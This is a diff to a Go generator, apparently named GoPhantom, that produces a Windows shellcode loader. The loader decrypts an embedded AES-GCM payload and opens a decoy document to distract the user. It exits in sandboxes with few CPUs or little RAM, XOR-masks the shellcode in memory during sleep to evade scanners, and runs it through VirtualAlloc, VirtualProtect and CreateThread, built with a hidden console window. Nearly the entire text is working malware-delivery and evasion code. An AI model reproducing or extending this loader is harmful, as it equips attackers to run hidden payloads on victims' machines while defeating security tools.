@@ -27,11 +27,11 @@ const logo = `
                                            by hsad
 `
 
-// loaderTemplate v1.3.1: Fixes missing constant definitions.
 const loaderTemplate = `
 //go:build windows
 // +build windows
 
+// 由 GoPhantom 生成的最终加载器
 package main
 
 import (
@@ -41,17 +41,15 @@ import (
 	"encoding/base64"
 	"fmt"
 	"golang.org/x/crypto/argon2"
-	"hash/crc32"
+	"golang.org/x/sys/windows"
 	"os"
 	"path/filepath"
-	"reflect"
 	"runtime"
-	"syscall"
 	"time"
 	"unsafe"
 )
 
-// --- Injected Data Constants (FIXED: This block was missing) ---
+// 这些常量由生成器在编译时动态注入。
 const (
 	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
 	encryptedDecoyBase64     = "{{.EncryptedDecoy}}"
@@ -59,155 +57,112 @@ const (
 	decoyFileName            = "{{.DecoyFileName}}"
 )
 
-// --- API Hashes ---
-const (
-	// kernel32.dll
-	HASH_KERNEL32DLL    = 0x7547e223
-	HASH_VIRTUALALLOC   = 0x9ce0d4a
-	HASH_VIRTUALPROTECT = 0x10066f2f
-	HASH_CREATETHREAD   = 0x906a06b0
+// decryptAESGCM 使用通过 Argon2id 从 Salt 派生出的 AES 密钥来解密 Base64 编码的数据。
+func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
+	salt, err := base64.StdEncoding.DecodeString(encodedSalt)
+	if err != nil { return nil, fmt.Errorf("salt decoding failed: %v", err) }
 
-	// shell32.dll
-	HASH_SHELL32DLL     = 0x69646261
-	HASH_SHELLEXECUTEW  = 0x6142c2a7
-)
+    const (
+        argon2Time = 1; argon2Memory = 64 * 1024; argon2Threads = 4; keyLength = 32
+    )
+    var argon2Password = []byte("gophantom-static-secret-for-derivation")
 
-// --- Win32 Constants ---
-const (
-	MEM_COMMIT_RESERVE = 0x3000
-	PAGE_READWRITE     = 0x04
-	PAGE_EXECUTE_READ  = 0x20
-	SW_SHOWNORMAL      = 1
-)
+	key := argon2.IDKey(argon2Password, salt, argon2Time, argon2Memory, argon2Threads, keyLength)
 
-// --- PE Parsing Structures ---
-type IMAGE_DOS_HEADER struct {
-	E_magic  uint16
-	_        [58]byte
-	E_lfanew int32
+	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
+	if err != nil { return nil, fmt.Errorf("ciphertext decoding failed: %v", err) }
+
+	block, err := aes.NewCipher(key)
+	if err != nil { return nil, fmt.Errorf("failed to create new cipher: %v", err) }
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil { return nil, fmt.Errorf("failed to create new GCM: %v", err) }
+
+	nonceSize := gcm.NonceSize()
+	if len(ciphertext) < nonceSize { return nil, fmt.Errorf("ciphertext is too short") }
+
+	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
+	return gcm.Open(nil, nonce, ciphertext, nil)
 }
 
-type IMAGE_NT_HEADERS struct {
-	Signature      uint32
-	FileHeader     [20]byte
-	OptionalHeader IMAGE_OPTIONAL_HEADER
-}
+// antiSandboxChecks 执行基本的反沙箱环境检查。
+func antiSandboxChecks() {
+	if runtime.NumCPU() < 2 { os.Exit(0) }
 
-type IMAGE_OPTIONAL_HEADER struct {
-	_             [96]byte
-	DataDirectory [16]IMAGE_DATA_DIRECTORY
-}
-
-type IMAGE_DATA_DIRECTORY struct {
-	VirtualAddress uint32
-	Size           uint32
-}
-
-type IMAGE_EXPORT_DIRECTORY struct {
-	_                     [24]byte
-	AddressOfFunctions    uint32
-	AddressOfNames        uint32
-	AddressOfNameOrdinals uint32
-}
-
-// simpleCRC32Hash must match the hasher tool's algorithm.
-func simpleCRC32Hash(s string) uint32 {
-	return crc32.ChecksumIEEE([]byte(s))
-}
-
-// getModuleBase gets the base address of a loaded DLL by its name's hash.
-func getModuleBase(moduleHash uint32) uintptr {
-	var dllName string
-	switch moduleHash {
-	case HASH_KERNEL32DLL:
-		dllName = "kernel32.dll"
-	case HASH_SHELL32DLL:
-		dllName = "shell32.dll"
-	default:
-		return 0
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
+	
+	type memoryStatusEx struct {
+		Length uint32; MemoryLoad uint32; TotalPhys uint64; AvailPhys uint64; TotalPageFile uint64
+		AvailPageFile uint64; TotalVirtual uint64; AvailVirtual uint64; AvailExtendedVirtual uint64
 	}
-	handle, _ := syscall.LoadLibrary(dllName)
-	return uintptr(handle)
+
+	var memStatex memoryStatusEx
+	memStatex.Length = uint32(unsafe.Sizeof(memStatex))
+	
+	ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatex)))
+	if ret != 0 {
+		if memStatex.TotalPhys/1024/1024/1024 < 4 { os.Exit(0) }
+	}
 }
 
-// getFuncAddress gets a function's address from a DLL's base address by its name's hash.
-func getFuncAddress(moduleBase uintptr, funcHash uint32) uintptr {
-	if moduleBase == 0 {
-		return 0
+// sleepObfuscate 在睡眠期间对内存中的 shellcode 进行 XOR 加密/解密，以规避内存扫描。
+func sleepObfuscate(address uintptr, size uintptr) {
+	key := make([]byte, 8)
+	_, err := rand.Read(key)
+	if err != nil {
+		time.Sleep(5 * time.Second)
+		return
 	}
-	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(moduleBase))
-	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(moduleBase + uintptr(dosHeader.E_lfanew)))
-	exportDirRVA := ntHeaders.OptionalHeader.DataDirectory[0].VirtualAddress
-	exportDir := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(moduleBase + uintptr(exportDirRVA)))
 
-	addrOfNames := (*[1 << 30]uint32)(unsafe.Pointer(moduleBase + uintptr(exportDir.AddressOfNames)))
-	addrOfFuncs := (*[1 << 30]uint32)(unsafe.Pointer(moduleBase + uintptr(exportDir.AddressOfFunctions)))
-	addrOfOrds := (*[1 << 30]uint16)(unsafe.Pointer(moduleBase + uintptr(exportDir.AddressOfNameOrdinals)))
+	mem := (*[1 << 30]byte)(unsafe.Pointer(address))[:size:size]
 
-	for i := 0; i < int(exportDir.AddressOfNames); i++ {
-		funcNameRVA := addrOfNames[i]
-		funcNamePtr := (*byte)(unsafe.Pointer(moduleBase + uintptr(funcNameRVA)))
-		
-		var funcName string
-		sh := (*reflect.StringHeader)(unsafe.Pointer(&funcName))
-		sh.Data = uintptr(unsafe.Pointer(funcNamePtr))
-		sh.Len = int(strLen(funcNamePtr))
-
-		if simpleCRC32Hash(funcName) == funcHash {
-			ordinal := addrOfOrds[i]
-			funcRVA := addrOfFuncs[ordinal]
-			return moduleBase + uintptr(funcRVA)
-		}
+	// 加密
+	for i := 0; i < len(mem); i++ {
+		mem[i] ^= key[i%8]
 	}
-	return 0
-}
 
-func strLen(s *byte) int {
-	var l int
-	for ; *s != 0; l++ {
-		s = (*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(s)) + 1))
+	time.Sleep(5 * time.Second)
+
+	// 解密
+	for i := 0; i < len(mem); i++ {
+		mem[i] ^= key[i%8]
 	}
-	return l
 }
 
 
-// --- Core Logic ---
-
+// executeShellcode 分配内存 (RW)，写入 shellcode，进行可选的睡眠混淆，
+// 修改内存保护为 (RX)，最后创建线程执行。
 func executeShellcode(shellcode []byte, obfuscate bool) {
-	kernel32Base := getModuleBase(HASH_KERNEL32DLL)
-	if kernel32Base == 0 { return }
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	virtualAlloc := kernel32.NewProc("VirtualAlloc")
+	virtualProtect := kernel32.NewProc("VirtualProtect")
+	createThread := kernel32.NewProc("CreateThread")
 
-	pVirtualAlloc := getFuncAddress(kernel32Base, HASH_VIRTUALALLOC)
-	pVirtualProtect := getFuncAddress(kernel32Base, HASH_VIRTUALPROTECT)
-	pCreateThread := getFuncAddress(kernel32Base, HASH_CREATETHREAD)
-	if pVirtualAlloc == 0 || pVirtualProtect == 0 || pCreateThread == 0 { return }
+	// 1. 以 PAGE_READWRITE 权限申请内存
+	addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if addr == 0 {
+		return
+	}
 
-	addr, _, _ := syscall.SyscallN(pVirtualAlloc, 0, uintptr(len(shellcode)), MEM_COMMIT_RESERVE, PAGE_READWRITE)
-	if addr == 0 { return }
-
-	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:], shellcode)
-
+	// 2. 将 shellcode 复制到新分配的内存中
+	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
+	copy(dst, shellcode)
+	
+	// 3. (可选) 执行睡眠混淆
 	if obfuscate {
 		sleepObfuscate(addr, uintptr(len(shellcode)))
 	}
-	
+
+	// 4. 将内存页权限从 RW 修改为 RX (PAGE_EXECUTE_READ)
 	var oldProtect uint32
-	syscall.SyscallN(pVirtualProtect, addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	_, _, errVirtualProtect := virtualProtect.Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+    if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
+		return
+	}
 	
-	syscall.SyscallN(pCreateThread, 0, 0, addr, 0, 0, 0)
-}
-
-func openDecoy(decoyPath string) {
-	shell32Base := getModuleBase(HASH_SHELL32DLL)
-	if shell32Base == 0 { return }
-
-	pShellExecuteW := getFuncAddress(shell32Base, HASH_SHELLEXECUTEW)
-	if pShellExecuteW == 0 { return }
-
-	verb, _ := syscall.UTF16PtrFromString("open")
-	path, _ := syscall.UTF16PtrFromString(decoyPath)
-	
-	syscall.SyscallN(pShellExecuteW, 0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(path)), 0, 0, SW_SHOWNORMAL)
+	// 5. 创建新线程来执行 shellcode
+	createThread.Call(0, 0, addr, 0, 0, 0)
 }
 
 func main() {
@@ -217,85 +172,20 @@ func main() {
 	if err == nil {
 		decoyPath := filepath.Join(os.Getenv("PUBLIC"), decoyFileName)
 		_ = os.WriteFile(decoyPath, decoyBytes, 0644)
-		openDecoy(decoyPath)
+		
+		verb, _ := windows.UTF16PtrFromString("open")
+		path, _ := windows.UTF16PtrFromString(decoyPath)
+		windows.ShellExecute(0, verb, path, nil, nil, windows.SW_SHOWNORMAL)
 	}
 	
 	shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesSaltBase64)
 	if err == nil {
+		// 检查环境变量以决定是否启用睡眠混淆
 		obfuscate := os.Getenv("GPH_OBFUS") == "1"
 		executeShellcode(shellcode, obfuscate)
 	}
 
 	time.Sleep(3 * time.Second)
-}
-
-// --- Helper functions ---
-func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
-	salt, err := base64.StdEncoding.DecodeString(encodedSalt)
-	if err != nil { return nil, fmt.Errorf("salt decoding failed: %v", err) }
-    const (
-        argon2Time = 1; argon2Memory = 64 * 1024; argon2Threads = 4; keyLength = 32
-    )
-    var argon2Password = []byte("gophantom-static-secret-for-derivation")
-	key := argon2.IDKey(argon2Password, salt, argon2Time, argon2Memory, argon2Threads, keyLength)
-	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
-	if err != nil { return nil, fmt.Errorf("ciphertext decoding failed: %v", err) }
-	block, err := aes.NewCipher(key)
-	if err != nil { return nil, fmt.Errorf("failed to create new cipher: %v", err) }
-	gcm, err := cipher.NewGCM(block)
-	if err != nil { return nil, fmt.Errorf("failed to create new GCM: %v", err) }
-	nonceSize := gcm.NonceSize()
-	if len(ciphertext) < nonceSize { return nil, fmt.Errorf("ciphertext is too short") }
-	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
-	return gcm.Open(nil, nonce, ciphertext, nil)
-}
-
-func antiSandboxChecks() {
-	if runtime.NumCPU() < 2 { os.Exit(0) }
-	
-	type MEMORYSTATUSEX struct {
-		Length                uint32
-		MemoryLoad            uint32
-		TotalPhys             uint64
-		AvailPhys             uint64
-		TotalPageFile         uint64
-		AvailPageFile         uint64
-		TotalVirtual          uint64
-		AvailVirtual          uint64
-		AvailExtendedVirtual  uint64
-	}
-	var memInfo MEMORYSTATUSEX
-	memInfo.Length = uint32(unsafe.Sizeof(memInfo))
-
-	kernel32Base := getModuleBase(HASH_KERNEL32DLL)
-	if kernel32Base == 0 { return }
-	globalMemoryStatusEx, _ := syscall.GetProcAddress(syscall.Handle(kernel32Base), "GlobalMemoryStatusEx")
-
-	if globalMemoryStatusEx != 0 {
-		ret, _, _ := syscall.SyscallN(globalMemoryStatusEx, uintptr(unsafe.Pointer(&memInfo)))
-		if ret != 0 {
-			if memInfo.TotalPhys/1024/1024/1024 < 4 {
-				os.Exit(0)
-			}
-		}
-	}
-}
-
-func sleepObfuscate(address uintptr, size uintptr) {
-	key := make([]byte, 8)
-	_, err := rand.Read(key)
-	if err != nil {
-		time.Sleep(5 * time.Second)
-		return
-	}
-	mem := (*[1 << 30]byte)(unsafe.Pointer(address))[:size:size]
-	for i := 0; i < len(mem); i++ {
-		mem[i] ^= key[i%8]
-	}
-	time.Sleep(5 * time.Second)
-	for i := 0; i < len(mem); i++ {
-		mem[i] ^= key[i%8]
-	}
 }
 `
 
@@ -398,6 +288,7 @@ func main() {
 	}
 
 	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
+	// NEW: Added log message about the new feature.
 	log.Println("[+] Evasion feature 'Sleep-Obfuscation' included. (Activate on target with env: GPH_OBFUS=1)")
 
 	ldflags := "-s -w -H windowsgui"
